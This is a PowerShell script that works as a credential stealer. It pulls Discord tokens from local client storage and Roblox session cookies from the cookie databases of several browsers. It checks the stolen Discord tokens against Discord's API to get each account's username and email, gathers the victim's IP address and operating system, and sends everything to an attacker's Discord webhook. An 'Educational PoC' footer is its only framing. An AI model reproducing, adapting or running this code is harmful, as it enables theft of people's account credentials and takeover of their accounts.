# === DISCORD TOKEN EXTRACTION ===
function Get-DiscordTokens {
    Write-Host "[*] Extracting Discord tokens..." -ForegroundColor Cyan
    
    $tokens = @()
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
    )
    
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            Write-Host "  [+] Checking: $path" -ForegroundColor Gray
            
            try {
                $files = Get-ChildItem -Path $path -Filter "*.ldb" -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        # Match both MFA and standard tokens
                        $mfaMatches = [regex]::Matches($content, 'mfa\.[A-Za-z0-9_-]{84}')
                        $standardMatches = [regex]::Matches($content, '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}')
                        
                        foreach ($match in $mfaMatches) { $tokens += $match.Value }
                        foreach ($match in $standardMatches) { $tokens += $match.Value }
                    }
                }
            } catch {
                Write-Host "  [!] Error reading $path" -ForegroundColor Red
            }
        }
    }
    
    return $tokens | Select-Object -Unique
}

# === ROBLOX COOKIE EXTRACTION ===
function Get-RobloxCookies {
    Write-Host "[*] Extracting Roblox cookies..." -ForegroundColor Cyan
    
    $cookies = @()
    
    # Chrome-based browsers (Edge, Chrome, Brave, Opera)
    $browserPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies"
    )
    
    # Firefox paths
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release" -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $browserPaths += "$($profile.FullName)\cookies.sqlite"
    }
    
    # Try each browser path
    foreach ($path in $browserPaths) {
        if (Test-Path $path) {
            Write-Host "  [+] Checking: $path" -ForegroundColor Gray
            
            try {
                # Copy DB to avoid locks
                $tempDb = "$env:TEMP\cookies_$(Get-Random).db"
                Copy-Item -Path $path -Destination $tempDb -Force -ErrorAction SilentlyContinue
                
                if (Test-Path $tempDb) {
                    # Load SQLite assembly
                    if (-not [System.Reflection.Assembly]::LoadWithPartialName('System.Data.SQLite')) {
                        Write-Host "  [!] SQLite assembly not found - skipping" -ForegroundColor Yellow
                        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                        continue
                    }
                    
                    $conn = New-Object System.Data.SQLite.SQLiteConnection
                    $conn.ConnectionString = "Data Source=$tempDb"
                    
                    try {
                        $conn.Open()
                        
                        # Different query based on browser type
                        if ($path -like "*.sqlite") {
                            $query = "SELECT name, value FROM moz_cookies WHERE name = '.ROBLOSECURITY'"
                        } else {
                            $query = "SELECT name, encrypted_value FROM cookies WHERE name = '.ROBLOSECURITY'"
                        }
                        
                        $cmd = $conn.CreateCommand()
                        $cmd.CommandText = $query
                        $reader = $cmd.ExecuteReader()
                        
                        while ($reader.Read()) {
                            if ($path -like "*Chrome*" -or $path -like "*Edge*" -or $path -like "*Brave*") {
                                # Chrome cookies are encrypted with DPAPI
                                Write-Host "  [!] Encrypted Roblox cookie found - requires DPAPI" -ForegroundColor Yellow
                                $cookies += "[Encrypted Roblox cookie found]"
                            } else {
                                # Firefox cookies are plaintext
                                $cookieValue = $reader["value"]
                                if ($cookieValue -like "*_.ROBLOSECURITY*") {
                                    $cookies += $cookieValue
                                }
                            }
                        }
                        
                        $reader.Close()
                    } catch {
                        Write-Host "  [!] SQL error: $_" -ForegroundColor Red
                    } finally {
                        $conn.Close()
                        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                    }
                }
            } catch {
                Write-Host "  [!] Error reading $path" -ForegroundColor Red
            }
        }
    }
    
    return $cookies | Select-Object -Unique
}

# === TOKEN VALIDATION ===
function Test-DiscordToken {
    param($token)
    
    try {
        $headers = @{
            "Authorization" = $token
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get -ErrorAction Stop
        return @{
            valid = $true
            username = "$($response.username)#$($response.discriminator)"
            id = $response.id
            email = $response.email
        }
    } catch {
        return @{ valid = $false }
    }
}

# === DISCORD WEBHOOK SEND ===
function Send-ToDiscord {
    param(
        $tokens,
        $robloxCookies,
        $tokenInfo
    )
    
    # Format token list
    $tokenText = ""
    if ($tokens.Count -gt 0) {
        $tokenText = $tokens -join "`n"
    } else {
        $tokenText = "No tokens found"
    }
    
    # Format Roblox cookies
    $robloxText = ""
    if ($robloxCookies.Count -gt 0) {
        $robloxText = $robloxCookies -join "`n"
    } else {
        $robloxText = "No Roblox cookies found"
    }
    
    # Get system info
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    
    # Build Discord embed (no emojis)
    $fields = @(
        @{
            name = "System"
            value = "PC: $computerName`nUser: $userName`nOS: $os`nIP: $ip"
            inline = $true
        },
        @{
            name = "Discord Tokens"
            value = "```$tokenText```"
            inline = $false
        },
        @{
            name = "Roblox Cookies"
            value = "```$robloxText```"
            inline = $false
        }
    )
    
    # Add token info if available
    if ($tokenInfo.valid) {
        $fields += @{
            name = "Valid Token"
            value = "User: $($tokenInfo.username)`nID: $($tokenInfo.id)`nEmail: $($tokenInfo.email)"
            inline = $false
        }
    }
    
    $embed = @{
        title = "Grabber Results"
        color = 0x5865F2
        fields = $fields
        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
        footer = @{
            text = "Educational PoC - VM Only"
        }
    }
    
    $payload = @{
        embeds = @($embed)
    } | ConvertTo-Json -Depth 10
    
    # Send to webhook
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
        Write-Host "[+] Results sent to Discord" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed to send: $_" -ForegroundColor Red
    }
}
